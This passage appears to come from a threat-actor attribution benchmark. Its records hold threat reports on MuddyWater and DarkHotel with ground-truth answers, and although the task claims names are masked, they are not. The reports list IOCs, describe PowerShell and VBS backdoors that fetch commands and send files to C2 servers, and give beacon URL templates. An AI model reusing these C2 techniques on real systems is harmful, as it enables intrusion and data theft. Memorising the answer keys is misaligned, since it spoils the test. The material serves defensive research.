2024, Google shared a recap of some of the events that have occurred since the start of 2024. The report includes information not reported by the local news or the INCD.\nWhen the INCD does share alerts about malicious cyber activity against Israeli companies, which is infrequent, they’re vague on specifics. Recently, they shared an alert about multiple state-sponsored groups targeting “mostly” a few specific sectors.\nThe alert also includes a Yara rule set and a long list of IOCs without any additional context.\nProviding IOCs without any context might help for a day, but there is a reason why they are located at the bottom of the “Pyramid of Pain,” a term we will often refer to in this blog.\nGoing Through a Pile of Garbage to Find Golden Nuggets\nWhile the shared information is not enough to be useful for the companies that are being targeted, let’s do a dumpster dive into what has been shared and see if we can salvage anything useful.\nThe Yara rules are for various wipers based on the rule’s names. Although no hashes or additional info is provided, it is possible to link the rules to the following specific attacks:\n1.\tBiBi wiper by KarMa\n2.\tHomeland Justice wiper targeting Albanian Parliament (2022)\n3.\tHomeland Justice wiper targeting Albania’s Institute of Statistics (INSTAT)\nGoogle links KarMa to DEV-0842/BanishedKitten. In Microsoft’s investigation into the 2022 Albanian government attacks, they “assessed with high confidence that multiple Iranian actors participated in this attack.” Microsoft states, “DEV-0842 deployed the ransomware and wiper malware,” while three additional groups participated in the attack. Each group was responsible for a different step in the “Cyber Kill Chain.”\nAdditionally, Microsoft links all the different groups in this attack to the Iranian Ministry of Intelligence and Security (MOIS).\nIn another investigation into the 2022 Albanian government attack, Mandiant also raised “the possibility of a cross-team collaboration.”\nThe IOC list shared by INCD includes hashes for seven files, only three of which are publicly available. Among those publicly available, two are generic webshells from 2020.\nThe last file is also a webshell. But unlike the other two, it is not a generic webshell but a variant of the FoxShell used by ScarredManticore/DEV-0861/ShroudedSnooper, which Microsoft observed participating in the 2022 cyberattack on the Albanian government.\nIf we make an analogy to medical terminology, webshell is just a symptom, and trying to prevent webshells by hash values is easily bypassed. Therefore, it is not considered as a prevention capability.\nOut of the three domains shared by INCD, only one is publicly known to be directly related to Iranian activity. The domain vatacloud[.]com was used by DEV-1084 (DarkBit) in their attack against the Technion in February 2023. According to Microsoft, “DEV-1084 likely worked in partnership with MERCURY.”\nMercury, known as MuddyWater, is also part of the Iranian MOIS.\nThe last of the IOCs includes 31 IP addresses without a description.\nOut of those, Deep Instinct could not identify any known malicious activity in 11 IP addresses.\nAnother 11 IP addresses are known to be associated with MuddyWater from previous campaigns,\nsuch as SimpleHarm, PhonyC2, and MuddyC2Go (1, 2).\nThe nine remaining IP addresses are most likely also related to MuddyWater. Moreover, we believe that these IPs host the latest tools used by the threat actor and their latest C2 framework, which we named “DarkBeatC2.”\nNow, let’s examine the additional context surrounding the above findings to see the full picture.\nPresenting “Lord Nemesis”\n“Lord Nemesis” is the latest, “all the rage” Iranian “faketivist” operation.\nDue to the lack of transparency and context in reports on most Iranian cyber operations against Israel, the following rare sighting of a detailed report about a recent supply-chain attack amplifies why context is so important.\nA unique report from OP Innovate details how the attackers, who call themselves “Lord Nemesis,” managed to access multiple organizations by compromising a single IT provider named “Rashim.”\nAccording to the report, “One of the critical factors that allowed Lord Nemesis to extend its attack beyond Rashim was the company’s practice of maintaining an admin user account on some of its customer systems. By hijacking this admin account, the attackers were able to access numerous organizations by using their VPN that relied on the Michlol CRM, potentially compromising the security of these institutions and putting their data at risk.”\nWhile the report contains additional context that explains how the attackers operated after they gained initial access, it does not explain how the attack was attributed to “Nemesis Kitten,” as mentioned at the beginning of their report.\nAccording to Microsoft, “Nemesis Kitten” is DEV-0270 (Cobalt Mirage, TunnelVision), a subgroup of the Iranian threat actor Mint Sandstorm (PHOSPHORUS, APT35, Charming Kitten), which we have previously observed exploiting Exchange servers.\nWhile “Mint Sandstorm” has been linked to the Iranian IRGC, DEV-0270 is a private subcontractor known as “SecNerd” or “Najee Technology.”\nHowever, the most important detail from Op Innovate’s blog is the following: “To instill fear in his victims and demonstrate the extent of his access, ‘Lord Nemesis,’ contacted a list of Rashim’s users and colleagues via Rashim’s email system on March 4th. This communication occurred four months after the initial breach of Rashim’s infrastructure, highlighting the attacker’s prolonged presence within the system.”\nThis is important because if “Lord Nemesis” were able to breach Rashim’s email system, they might have breached the email systems of Rashim’s customers using the admin accounts that now we know they obtained from “Rashim,” thanks to Op Innovate’s reporting.\nSo, why is this so important? Read on.\nBack to MuddyWater\nWe have reported about MuddyWater activity numerous times.\nDespite the reports, the threat actor only slightly changes its core TTPs, as the “Pyramid of Pain” predicted. While occasionally switching to a new remote administration tool or changing their C2 framework (due to a previous one being leaked), MuddyWater’s methods remain constant, as described in our very first blog about the threat actor.\nIn a recent security brief by Proofpoint, MuddyWater (TA450) was observed sending PDF attachments from the email of a compromised Israeli company.\nThose PDF attachments contained links to various web hosting services where users could download an archive containing a remote administration tool, as shown in Figure 3 above.\nHowever, one of those web hosting providers – “Egnyte,” with a “salary.egnyte[.]com” subdomain – was new and not previously known to be in use by MuddyWater.\nWhile this change seems minor and insignificant, it is the exact opposite when given additional context. At the same time Proofpoint reported this campaign, Deep Instinct observed a similar campaign using a different subdomain, “kinneretacil.egnyte[.]com.” The subdomain refers to the domain “kinneret.ac.il,” which is an Israeli higher education college.\nKinneret is a customer of “Rashim,” thanks to the information that was shared by OP Innovate. This led us to believe that kinneretacil.egnyte[.]com might be part of their infrastructure compromised by “Lord Nemesis,” especially since it shared username “ori ben-dor” which looks like an authentic Israeli name (see Figure 4).\nThanks to the context given by Proofpoint, it appears the Egnyte account was not compromised but rather created by MuddyWater. This can be seen by the lack of creativity in the uploader name (“Shared by gsdfg gsg”) in the instance Proofpoint observed (See Figure 5).\nSince MuddyWater used a compromised email account to spread the links to salary.egnyte[.]com, this was also likely with the kinneretacil.egnyte[.]com links, although we don’t have direct evidence.\nMuddyWater may have used the “Kinneret” email account to distribute these links, exploiting the trust recipients have in the sender as a familiar and credible organization.\nDuring the same time, another archive hosted both on Sync and OneHub was observed using the Hebrew name for “scholarship.” This indicates another potential abuse of their access to “Rashim’s” accounts to target victims in the education sector, tricking them into installing a remote administration tool.\nWhile not conclusive, the timeframe and context of the events indicate a potential hand-off or collaboration between IRGC and MOIS to inflict as much harm as possible on Israeli organizations and individuals.\nAdditional MuddyWater Shenanigans\nIn early March 2024, after a year of silence, DarkBit made some bold claims about their new victims. However, so far, the only proof they have provided indicates a single compromise at the INCD.\nFor those of you who don’t remember, DarkBit is the group that took responsibility for the Technion hack. Microsoft attributed it to MuddyWater, and DarkBit itself later admitted this (See Figure 6).\nWhile DarkBit has since deleted this message, the internet still remembers.\nIn their current iteration, DarkBit decided to upload and leak stolen data using “freeupload[.]store”\nDuring the same timeframe, in early March 2024, Deep Instinct identified two different MSI files named “IronSwords.msi,” which are installers of “Atera Agent,” the current RMM used by MuddyWater.\nThose files have been uploaded as is, without being packaged into archives. One file has been uploaded to filetransfer[.]io, while the second file was uploaded to freeupload[.]store.\nThe domain freeupload[.]store belongs to the “0Day forums,” a hacking community on the dark web.\nThe discovery of the Atera installer on a public hosting service, by itself, does not provide sufficient evidence to draw conclusions. However, when considering the context – the specific filename, the timing of its appearance, the nature of the software, and the fact the same file hosting service was used – the likelihood that these two files are connected to another Iranian campaign, likely carried out by MuddyWater, is significantly increased.\nIntroducing DarkBeatC2\nDeep Instinct found a needle in the haystack: the DarkBeatC2 and other new tools that MuddyWater most likely uses.\nThe IP address 185.236.234[.]161 is not known to be associated with MuddyWater. However, it does belong to “Stark-Industries,” a known hosting provider for malicious activity.\nThe IP address hosts the “reNgine” open-source reconnaissance framework.\nWhile there is no previous public documentation of MuddyWater using this framework, they have a track record of using a variety of open-source tools, and reconnaissance is an important part of the “Cyber Kill Chain.”\nAdditionally, the domains aramcoglobal[.]site and mafatehgroup[.]com point to the IP address 185.236.234[.]161.\nThe domain mafatehgroup[.]com impersonates the domain mafateehgroup.com, which is a digital services provider with offices in Jordan and Saudi Arabia. Jordan, Saudia, and Aramco are known targets of Iranian threat actors.\nThe IP address 185.216.13[.]242 also belongs to “Stark-Industries,” but this IP hosted an administration panel for “Tactical RMM.”\nCybersecurity researchers have reported that “Tactical RMM” is being exploited by threat actors to deploy ransomware.\n“Tactical RMM” is another remote administration tool. It’s no surprise that MuddyWater is abusing it given its track record of leveraging RATs.\nThe domain “websiteapicloud[.]com” resolves to the same IP address, 185.216.13[.]242, which hosts the “Tactical RMM.” This has already been observed to be linked to an unnamed APT.\nWhile writing this blog, we learned that “Intel-Ops” is also tracking the MuddyWater activity described above.\nDeep Instinct tracks the domain “websiteapicloud[.]com” as part of MuddyWater's new DarkBeatC2 framework.\nWhile IP addresses are at the bottom of the “Pyramid of Pain” and should be easy for a threat actor to change, MuddyWater keeps reusing the same IP addresses.\nEarly links between MuddyWater and DarkBeatC2 can be seen in the following IP addresses:\n1.\t91.121.240[.]102 – This IP was mentioned almost a year ago in the “SimpleHarm” campaign, but in February this year, the domain googlelinks[.]net started to point to it.\n2.\t137.74.131[.]19 – This IP is in the same subnet that has been known to host MuddyWater servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain googlevalues[.]com also pointed to this IP address in February 2024.\n3.\t164.132.237[.]68 – This IP is in the same subnet that has been known to host MuddyWater servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain nc6010721b[.]biz resolved to this IP address in 2021. The domain name pattern (6nc/nc6) is very similar to domains we suspected to be related to MuddyWater in their “PhonyC2” campaign. While we still can’t confirm whether this is done by the VPS provider or by MuddyWater, there is a relation between those two.\nWhile there are more domains and IPs related to the DarkBeatC2, which you can find in the indicators appendix to this blog, we will focus on the following domain: googleonlinee[.]com\nMuch like MuddyWater’s previous C2 frameworks, it serves as a central point to manage all of the infected computers. The threat actor usually establishes a connection to their C2 in one of the following ways:\n1.\tManually executing PowerShell code to establish a connection to the C2 after gaining initial access via another method.\n2.\tWrapping a connector to execute the code to establish a C2 connection within the first stage payload, which is delivered in a spear phishing email.\n3.\tSideloading a malicious DLL to execute the code to establish a C2 connection by masquerading as a legitimate application (PowGoop and MuddyC2Go).\nWhile we could not identify how the connection to DarkBeatC2 was made, we were able to obtain some of the PowerShell responses to understand more about what it does and how.\nIn general, this framework is similar to the previous C2 frameworks used by MuddyWater. PowerShell remains their “bread and butter.”\nThe URL googleonlinee[.]com/setting/8955224/r4WB7DzDOwfaHSevxHH0 contains the following PowerShell code:\nThe above code simply fetches and executes two additional PowerShell scripts from the same C2 server.\nThe code from the URL with “8946172” is included in Figure 9.\nThis code is also simple. It reads the contents of a file named “C:\\ProgramData\\SysInt.log“ and sends it to the C2 via a POST request.\nWhile we don’t know the contents of the file, the C2 framework creates it in another stage, perhaps for a similar purpose to the file named “db.sqlite” in PhonyC2.\nThe code from the second URL, with “7878123,” is included in Figure 10.\nThis code is more complex than the previous two code snippets. It runs in a loop that sleeps for 20 seconds, trying to connect to the C2 and fetch additional content. If the content is not null, there is an additional check to see if the content contains the string “SRT_”. If this string is present, the content is converted into an array with the sign “_” as a delimiter. The script then takes the second object of the array and sleeps the amount of time in seconds that is represented as a number in that object.\nIf the content is not null but does not contain the string “SRT_” the script will convert the content of the response into a scriptblock and will execute it while writing the response to the aforementioned “SysInt.log” file.\nDuring our analysis, the server responded with a 403-error message. As such, we did not receive any content during this phase.\nConclusion\nIranian threat actors are actively targeting Israeli networks. Sharing information about these active intrusions could lead to proper treatment for the issue. Exposing attack vectors and addressing underlying vulnerabilities is more effective than simply reacting to IOCs after an infection has occurred.\nWe encourage everyone to share their findings – with context – like OP Innovate did.\nBecause the security posture and maturity level of blue teams vary between companies and industries, minimizing time to breach detection is crucial.\nRelying solely on products that enhance detection capabilities could backfire and slow the blue team’s detection capabilities due to the sheer amount of data that needs to be processed.\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "MuddyWater"
    },
    {
        "url": "https://lab52.io/blog/muddywaters-light-first-stager-targetting-middle-east/",
        "Text": "MuddyWater’s “light” first-stager targeting Middle East\nJune 21, 2022\nSince the last quarter of 2020 MuddyWater has maintained a “long-term” infection campaign targeting Middle East countries. We have gathered samples from November 2020 to January 2022, and due to the recent samples found, it seems that this campaign might still be currently active. The latest campaigns of the Muddy Water threat group, allegedly sponsored by the Iranian government and linked to the Iranian revolutionary guard (the main armed forces of the Iranian government), could be framed within the dynamics of maintaining Iran’s regional sovereignty.\nThis infection campaign always starts with a compressed file wrapping a malicious Word document containing VBA macros.\nMalicious document sample\nWhile our oldest sample looks a little more sophisticated based on the content of the document, which seems more specifically crafted for Arabic speakers as shown in the previous image, the rest of them contain generic English message to enable macros.\nMalicious document sample\nAlthough it has not been possible to clearly identify their specific target, it has been observed that these campaigns have been directed against countries such as Pakistan, Kazahstan, Armenia, Syria, Israel, Bahrain, Turkey, South Africa, Sudan, etc. Many of these countries may be of interest to the alleged Iranian threat actor, as some of them have been involved in recent internal conflicts, or are implicated in nuclear energy improvement, or may serve as strategic footholds for the development and influence of Iranian interests in other parts of the world.\nThe macros are very concise and their only purpose is to write a not-so-much obfuscated VBS script into a file located in C:\\ProgramData or the Windows Startup folder, with names such as Temp_[3-5 random chars].txt.\nMalicious VBA macro code\nThe dropped script is a small RAT which allows to execute commands via cmd. It first calls a recon function which executes whoami, and sets a country code which is already present in the script. The result of this will then be part of the URI used for the C2 contact. The set of different country codes found in the gathered samples are the following, and might indeed reveal the targets for each campaign:\n•\tPK –> Pakistan\n•\tAR –> Argentina\n•\tAM –> Armenia\n•\tSY –> Syria\n•\tIL –> Israel\n•\tBH –> Bahrain\n•\tTR –> Turkey\n•\tSA –> Saudi Arabia\n•\tSD –> Sudan\n•\tKK –> Kazakhstan\nAfter building the recon string, it will execute its main function. This function first executes explorer.exe (without apparent functional reason), and then calls a function to choose one IP from an array which will rotate in case of the chosen IP not replying to the subsequent C2 connection. This connection to the C2 server will use an HTTP GET request using the following structure:\n\nhttp://{ IP_address }/getCommand?guid={ recon_string }\nAs aforementioned, in the case of an empty reply, it will rotate the IP address and try again with the next. Otherwise it will deobfuscate the reply and call a function to execute it by creating a WScript.Shell object to call cmd:\n\nAs also seen on the deobfuscated snippet, it will output the result into a txt file and immediately read its content to return it to the calling function in order to include the result and send it to the C2 server. The next contact will use the POST HTTP method and will follow a slightly different structure and the command output in the body:\n\nhttp://{ IP_address }/getTargetInfo?guid={ recon_string }&status={ flag_value }\nHTTP POST communication from VBS sample\nInterestingly, the value renamed by us as “flag_value” will be included as the “state” value within the POST request. In the script file, it is a variable that is initialized to 0 in every collected sample, and is always set to 1 before executing the received command and sending the result in the POST request. Other than this, it is not modified or used in the script file. However, it is checked during the renamed “whoami_wrap” for the initial host recon at the beginning of the script. It is compared with the value 126, and in case of resolving True, it will display the following message box.\nMalicious VBS “alternative functionality”\nThe only implemented functionality in every analyzed sample is the #1, which will use WMI to display the following information about the infected system:\nSuch a small script with incomplete functionality, after almost two years being used for different campaigns could suggest that the attackers might modify its functionality in a later stage, based on the obtained information from the infected host or, at least, use it to download and drop the next infection stage.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "MuddyWater"
    },
    {
        "url": "https://www.inforisktoday.com/muddywater-targets-critical-infrastructure-in-asia-europe-a-18611",
        "Text": "MuddyWater Targets Critical Infrastructure in Asia, Europe\nIran-Backed Hacking Group Targets Telecom, Defense, Government Sectors \nHacking group MuddyWater, which has been linked to the Iranian Ministry of Intelligence and Security is targeting government and private sector organizations in Asia, Africa, Europe and North America as part of its cyberespionage and other malicious cyber operations, according to a joint advisory from U.S. and U.K. law enforcement and intelligence agencies.\nSectors targeted by the advanced persistent threat actor include telecommunications, defense, local government, and oil and natural gas. The advisory details the tactics, techniques and procedures, as well as the indicators of compromise, associated with the threat group.\nDirk Schrader, resident CISO, EMEA, and vice president of security research at cybersecurity firm Netwrix, says government-linked APTs such as MuddyWater will use the Russia-Ukraine conflict for their own purposes. Knowing that focus and attention are directed there, he says, the groups may use adapted spear-phishing emails while everyone is expecting a massive cyber operation.\nMuddyWater was earlier suspected of using ransomware to damage the systems of organizations in Israel and other countries. The group is also known as EMP.Zagros, Static Kitten, Mercury and Seedworm (see: Iranian Hacking Group Suspected of Deploying Ransomware).\nAbout MuddyWater\nMuddyWater, a subordinate element in the Iranian Ministry of Intelligence and Security, has conducted broad cyber campaigns in support of MOIS objectives since 2018, the advisory says.\nIn 2017 Kaspersky spotted MuddyWater using spear-phishing techniques to target government agencies, military institutions, telecommunications companies and universities throughout the Middle East.\nThe threat group is positioned to provide the Iranian government with stolen data and access to systems and to share these with other malicious cyber actors, the advisory says, citing analysis by the U.K National Cyber Security Center, the U.S. Cybersecurity and Infrastructure Security Agency, the National Security Agency, the Federal Bureau of Investigation and U.S. Cyber Command's Cyber National Mission Force.\nThe Iranian government-sponsored group was exploiting publicly known vulnerabilities and leveraging multiple open-source tools to gain access to sensitive government and commercial networks and deploy ransomware, the advisory says. \"These actors also maintain persistence on victim networks via tactics such as side-loading dynamic link libraries, to trick legitimate programs into running malware and obfuscating PowerShell scripts to hide command and control functions.\"\nTechnical Analysis\n\"MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor’s command and control server or a PDF file that drops a malicious file to the victim’s network,\" the advisory says.\nIt also uses multiple malware sets, such as PowGoop, Small Sieve, Canopy/Starwhale, Mori and POWERSTATS for loading malware, backdoor access, persistence and exfiltration.\n\"APT groups will rearrange their TTPs after being called out. That reinforces the need to be prepared, to have an established security architecture, with embedded workflows that dissolve security silos often seen in organizations, where protecting infrastructure, identities and data is handled in different ways, while attackers will use holes in all three layers to achieve their objectives,\" Netwrix's Schrader tells Information Security Media Group.\nPowGoop\nThe campaign appears to be using a malicious loader named PowGoop - a fake Google Update mechanism - consisting of a DLL loader and a PowerShell-based downloader.\nThe malicious file impersonates a legitimate file that is signed as a Google Update executable file. The PowGoop samples analyzed by CISA and CNMF shows it has components to retrieve encrypted commands from a C2 server.\nSmall Sieve\nA sample analyzed by the NCSC determined Small Sieve to be a Python backdoor distributed using a Nullsoft Scriptable Install System installer, gram_app.exe, which installs the Python backdoor, indoor.exe, and adds it as a registry run key that enables persistence.\n\"MuddyWater disguises malicious executables, and uses filenames and registry key names associated with Microsoft's Windows Defender to avoid detection during a casual inspection. The APT group has also used variations of Microsoft (e.g., 'Microsift') and Outlook in its filenames associated with Small Sieve,\" the advisory says.\nThe backdoor provides the basic functionality required to maintain and expand a foothold in the victim's infrastructure and avoid detection by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface, the advisory says. It says the Small Sieve's beacons and tasking are performed using Telegram API.\nCanopy\nCanopy or Starwhale malware is another sample that MuddyWater distributes using spear-phishing emails with targeted attachments. In samples analyzed by CISA, a malicious Excel file, Cooperation terms.xls, contained macros written in Visual Basic for Applications and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.\nMori\nThe advisory says that the APT group MuddyWater also uses the Mori backdoor, which uses Domain Name System tunneling to communicate with the group’s C2 infrastructure.\n\"According to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer, which appears to be a component to another program,\" the advisory says.\nSome of the tasks performed include deleting the file FILENAME.old and deleting the file by registry value, it says.\nPOWERSTATS\nThe APT group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems.\n\"CNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools - along with JavaScript files used to establish connections back to malicious infrastructure - to the malware aggregation tool and repository, Virus Total,\" the advisory says.\nThe government agencies recently observed MuddyWater exploiting the Microsoft Netlogon elevation of privilege vulnerability CVE-2020-1472 and the Microsoft Exchange memory corruption vulnerability CVE-2020-0688.\nMitigation\nOrganizations must proactively maintain reasonable cyber hygiene aligned with business context, says Yaniv Bar-Dayan, CEO and co-founder of cyber risk remediation provider Vulcan Cyber.\n\"IT security teams must first ask themselves: 'What are the crown jewels of my organization?' and then work to secure these priorities. An orchestrated and deliberate approach to risk measurement, management and mitigation will deliver the needed security to protect against the hacker group flavor of the day,\" Bar-Dayan says.\nThe joint advisory also recommends deploying application control software to limit the applications and executable code that can be run by users. Email attachments and files downloaded via links in emails often contain executable code.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "MuddyWater"
    },
    {
        "url": "https://blog.bushidotoken.net/2020/06/deep-dive-darkhotel-apt.html",
        "Text": "PART 1: DARKHOTEL\n\n\nDarkHotel is a sophisticated and active advanced persistent threat (APT) group. It’s highly capable and is known for finding and taking advantage of previously unknown vulnerabilities in common software also known as a 0day. It is a well-established group that has been active since 2007, are known Korean-speakers, and are working on behalf of a nation state. \n\n\nDarkHotel was first disclosed in 2014 and is also known as DUBNIUM, Black Shop, Fallout Team, Karba, Luder, Nemim, Nemain, Tapaoux, Pioneer, Shadow Crane, APT-C-06, and TUNGSTEN BRIDGE. From the NSA’s sigs.py script (also known as Territorial Dispute or TeDi) DarkHotel is signature number 25 (SIG25). Malware associated with DarkHotel includes Asruex, Parastic Beast, Inexsmar, Retro backdoor, Gh0st RAT, and the new Ramsay toolkit. Vulnerabilities leveraged in its 0day exploits include CVE-2018-8174, CVE-2018-8373, CVE-2019-1458, CVE-2019-13720, CVE-2019-17026, and CVE-2020-0674. DarkHotel also often exploits CVE-2017-8570 and CVE-2017-11882, high-risk well-known issues in Microsoft Office.\n\n\nDarkHotel appropriately earned its name infecting the WiFi networks (WLANs) of hotels typically used by business executives. This was in effort to compromise their devices such as smartphones and laptops that may potentially contain intellectual property and the individual’s emails or contact lists. The WLAN of the hotels are compromised via leveraging stolen certificates, deploying .HTA files that masquerades as software updates containing the malware. The WiFi routers themselves are taken over either by remotely exploiting vulnerabilities or by gaining physical access inside the targeted hotels. As DarkHotel is state-sponsored it more than likely has capable human operators to deploy during its campaign. \n\n\nThis APT has targeted a wide array of countries in Asia, Europe, North America, and Africa. It primarily focuses on North Korea, South Korea, Japan, and China. Organisations in sectors such as telecommunications, manufacturing, finance, pharmaceutical, chemicals, automotive, defence, law enforcement, militaries, and NGOs have all been compromised by DarkHotel.\n\n\nDarkHotel has repeatedly demonstrated its capabilities of developing exploits for 0day vulnerabilities in software such as Google Chrome, Mozilla Firefox, Internet Explorer, and Windows Kernel. The exploits are leveraged to deliver malware that can provide backdoor access and remote control over the target device. DarkHotel hides its malware behind layers of encryption, obfuscation, and only deploys it in singular attacks so as not to expose its stolen certificates or 0day vulnerabilities. This group is a well-established expert at spear-phishing where it has researched its targets using OSINT and potentially HUMINT. Its lures have included political news, changes in legislation, and other business news. \n\n\nIn November 2014, we saw the first details of the specific activities of the DarkHotel APT. Kaspersky published a report detailing a sophisticated cyber-espionage campaign targeting business travelers in the Asia-Pacific region. The group has been around for nearly a decade and some researchers believe its members are Korean speakers. In 2015, it was found that DarkHotel was more than likely exploiting a leaked 0day vulnerability from the Italian offensive security firm, Hacking Team. DarkHotel used  spear-phishing emails with .RAR archives that appear to hold a harmless-looking .jpg file. If opened, MS paint is launched and its malware is executed in the background. \n\n\nIn May 2018, DarkHotel was found to be responsible for distributing a 0day for CVE-2018-8174. This attack used URLMoniker to invoke Internet Explorer via Microsoft Word while ignoring the victim's default browser settings - a previously unknown technique. The group also leveraged CVE-2018-8373 later that same year.\n\n\nIn November 2019, a threat campaign was discovered, dubbed ‘Operation WizardOpium’, which exploited a vulnerability in Google’s Chrome Browser, tracked as CVE-2019-13720. The exploit was deployed on a Korean-language news portal, the site’s main page had malicious JavaScript injected into it. No threat group has been linked directly to Operation WizardOpium, but similarities in code samples have been correlated with both the Lazarus and DarkHotel APTs. Part of the attacks included a Microsoft Windows privilege escalation 0day exploit - which was later assigned CVE-2019-1458 - that utilised the win32k component of the Windows kernel. This bug, CVE-2019-1458, meant that the attackers could bypass detection systems on Google Chrome’s sandbox to deploy the other 0day exploit for CVE-2019-13720. [1]\n\n\nMore recently, ESET uncovered a previously unreported cyber-espionage toolkit, dubbed Ramsay, that is tailored for collection and exfiltration of sensitive documents and is capable of operating within air-gapped networks. It shares similarities with the Retro backdoor and is linked to DarkHotel. [2]\n\n\nTencent has further analysed the Ramsay attacks and cross-analysed the IOCs with campaigns it has tracked in the past. Interestingly, these attacks and those related to the Retro backdoor go as far back as 18 years ago and later incorporated the Asruex backdoor to attack isolated networks since 2015. Tencent has linked these attacks to DarkHotel, a threat group that it claims is allegedly working for the National Intelligence Service of the South Korean government. [3]\n\n\nThe DarkHotel threat group has launched a large campaign targeting Chinese government agencies and their employees. The attacks began in March, and are thought to be using coronavirus-themed lures. The threat actors are using a 0day vulnerability (tracked as SRC-2020-281) in Sangfor SSL VPN servers to provide remote access to enterprise and government networks. [4]\n\n\nSecurity research group RedDrip also found that the DarkHotel threat group developed a new exploit for another Internet Explorer (IE) vulnerability, CVE-2019-1367, to target China. At the time of reporting, the malicious file being used to exploit this flaw is currently detected by 18 out of 57 engines on VirusTotal. [5, 6]\n\n\nIn April 2020, JPCERT found that an APT group was exploiting two vulnerabilities patched earlier this year in Firefox and Internet Explorer (IE). These attacks have mostly been aimed at China and Japan. The first flaw affects the Firefox browser and is tracked as CVE-2019-17026. The second, designated CVE-2020-0674, is a remote code execution (RCE) flaw in Internet Explorer. Both bugs were patched in January and February 2020. Both vulnerabilities were used as part of a campaign aimed at Chinese government agencies and attributed to the DarkHotel APT. This campaign delivered the Gh0st RAT malware onto compromised devices. [7]\n\n\nThreat actors recently attempted to break into the systems of the World Health Organization (WHO). The organisation reported a significant increase in attacks against it since the start of the coronavirus pandemic. The most recent activity was observed around 13 March, when a group of malicious actors launched a fake site impersonating the WHO's internal email system. It has not be confirmed who is exactly responsible for the attack but researchers believe that it was the DarkHotel threat group. Further, Kaspersky researchers found that the same infrastructure was also used in targeting other healthcare and humanitarian organisations. [8]\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "DarkHotel"
    },
    {
        "url": "https://www.trellix.com/blogs/research/suspected-darkhotel-apt-activity-update/",
        "Text": "Suspected DarkHotel APT activity update\nIntroduction:\nOur advanced threat research team has discovered a first-stage malicious campaign targeting luxury hotels in Macao, China since the latter half of November 2021. The attack started with a spear phishing email directed to the hotel’s management staff in roles like the vice president of HR, assistant manager and front office manager. Based on the job titles we can assume that the targeted individuals have sufficient access into the hotel’s network, including the booking systems. The email used for this spear phishing attack contains an attachment with an Excel sheet. This Excel sheet is used to trick the victim and enable malicious macros embedded when it’s opened. Those macros enable several mechanisms detailed in the Technical Analysis part and summarized in the Infection Flow Chart below. Firstly, macros create a scheduled task to perform recognition, data listing and data exfiltration. Then, to enable communication with the Command-and-Control server used to exfiltrate victim data, macros are using a known lolbas (Living Off the Land Binaries and Scripts) technique to perform PowerShell command lines as trusted script:\n\nAn external report written in late December 2021 by the Zscaler’s research team talked about APT DarkHotel activity with a detailed analysis of a new attack chain. In this paper, IP related to the C2 infrastructure used for system information exfiltration mentioned:” 23.111.184[.]119”. Once exposed, we often see threat actors move their operation to different infrastructure or halt their operations for some time. However, in this case neither happened and the IP has been used by the actor continuously even after we finished our initial research.\nThis IP was used by the actor to drop new payloads as first stages to set up the victim environment for system information exfiltration and potential next steps. Those payloads were used to target major hotel chains in Macao, including the Grand Coloane Resort and Wynn Palace.\nTrellix’s customers are protected from this threat thanks to our technologies. Generic signatures names have been attributed: “RDN/Generic Downloader.x”\" and “BehavesLike.OLE2.Downloader.cg\".\nDarkHotel Background:\nDarkHotel, a suspected South Korean advanced persistent threat (APT) group, is known for targeting law enforcement, pharmaceuticals and automotive manufacturers, along with other industries. The group got their name by targeting hotels and business hotel visitors through spear phishing campaigns with malicious code to steal sensitive data from top executives like CEOs and sales leaders while staying in luxury hotels.\nAttribution:\nWe attribute this campaign to the DarkHotel with a moderate level of confidence. In our research we came across the following pieces of evidence that supports the possible DarkHotel attribution:\n•\tThe IP mentioned has been attributed to DarkHotel C2 activity by the cybersecurity community\n•\tThe targeted sector and the country fit within the DarkHotel target profile\n•\tThe Command-and-Control panel presents known development patterns attributed to DarkHotel APT\nHowever, we have lowered our confidence level to moderate because the specific IP address remained active for quite some time even after being publicly exposed and the same IP-address is the origin of other malicious content not related to this specific threat. These two observations have made us more cautious in our attribution.\nCampaign Analysis:\nWe will detail the suspected DarkHotel technical behavior in this specific campaign.\nOn Tuesday, December 7, 2021, an email was sent to seventeen different hotels in the Macao area from the “Macao Government Tourism Office” with an attachment to the email an Excel file named “信息.xls” (information.xls). We were able to identify the seventeen hotels by examining the mail headers of the phishing mail.\nIn another email related to this campaign, the actor is luring the hotel’s staff victim by asking them to complete the Excel file to specify which people were staying at the hotel and with the subject “passenger inquiry”:\nDear Sir/Madam,\nPlease open the attached file with enable content and specify whether the people were staying at the hotel or not?\n\nYours faithfully,\nInspection Division - MGTO\nTechnical Analysis:\nBy looking the code related to the Excel file, we can determine which operational system and Office version have been used to generate it. The 